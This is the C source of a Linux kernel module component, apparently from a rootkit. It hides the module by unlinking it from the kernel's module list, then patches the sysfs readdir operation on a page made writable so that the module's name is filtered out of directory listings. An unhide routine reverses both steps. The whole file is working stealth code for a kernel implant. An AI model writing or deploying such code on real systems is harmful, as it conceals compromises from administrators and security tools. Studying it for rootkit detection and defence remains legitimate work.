#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
//#include <linux/sched.h>
//#include <linux/list.h>

#include "hide_module.h"

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hook_read.h"


/// sysfs stuff
typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
fun_int_file_dirent_filldir_t original_sysfs_readdir;
filldir_t original_sysfs_filldir;




int hidden = 0;

struct list_head tos;

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);


/*
 * Hiding a module is basically just removing it from the list of modules
 */
void hide_module(void)
{
    struct list_head *prev;
    struct list_head *next;
    if(hidden == 1)
        return;
    prev = THIS_MODULE->list.prev;
    next = THIS_MODULE->list.next;
    prev->next = next;
    next->prev = prev;
    hidden = 1;
    hook_sysfs();
}


void unhide_module(void)
{
    struct list_head *mods;
    struct list_head *this_list_head;
    if(hidden == 0)
        return;

    mods = (struct list_head *) ptr_modules;
    this_list_head = &THIS_MODULE->list;


    //insert this module into the list of modules (to the front)
    mods->next->prev = this_list_head; // let prev of the (former) first module point to us
    this_list_head->next = mods->next; // let our next pointer point to the former first module

    mods->next = this_list_head; // let the modules list next pointer point to us
    this_list_head->prev = mods; // let out prev pointer point to the modules list

    hidden = 0;
    unhook_sysfs();
}


int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (strcmp(name, THIS_MODULE->name) == 0){
        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
        return 0;
    }
    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
    OUR_DEBUG("Hooked sysfs_readdir.\n");
    original_sysfs_filldir = filldir;
    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
}


void hook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    original_sysfs_readdir = sysfs_dir_ops->readdir;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}


void unhook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = original_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}
